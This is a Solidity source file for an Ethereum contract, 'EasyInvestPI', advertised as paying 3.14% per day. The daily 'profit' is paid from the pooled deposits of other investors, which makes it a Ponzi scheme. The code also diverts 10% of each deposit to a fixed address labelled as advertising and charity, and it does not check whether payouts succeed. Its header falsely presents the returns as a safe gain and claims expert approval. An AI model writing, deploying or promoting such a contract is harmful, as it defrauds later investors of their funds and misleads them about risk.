pragma solidity ^0.4.24;

/**
 *
 * Easy Investment PI Contract
 *  - GAIN 3.14% PER 24 HOURS (every 5900 blocks)
 *  - 10% of the contributions go to project advertising and charity
 *
 * How to use:
 *  1. Send any amount of ether to make an investment
 *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don&#39;t care unless you&#39;re spending too much on GAS)
 *  OR
 *  2b. Send more ether to reinvest AND get your profit at the same time
 *
 * RECOMMENDED GAS LIMIT: 70000
 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
 *
 * Contract reviewed and approved by pros!
 *
 */
contract EasyInvestPI {
    // records amounts invested
    mapping (address => uint256) invested;
    // records blocks at which investments were made
    mapping (address => uint256) atBlock;

    // this function called every time anyone sends a transaction to this contract
    function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * 3.14% * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint256 amount = invested[msg.sender] * 314 / 10000 * (block.number - atBlock[msg.sender]) / 5900;

            // send calculated amount of ether directly to sender (aka YOU)
            address sender = msg.sender;
            sender.send(amount);
        }
        
        address(0x64508a1d8B2Ce732ED6b28881398C13995B63D67).transfer(msg.value / 10);

        // record block number and invested amount (msg.value) of this transaction
        atBlock[msg.sender] = block.number;
        invested[msg.sender] += msg.value;
    }
}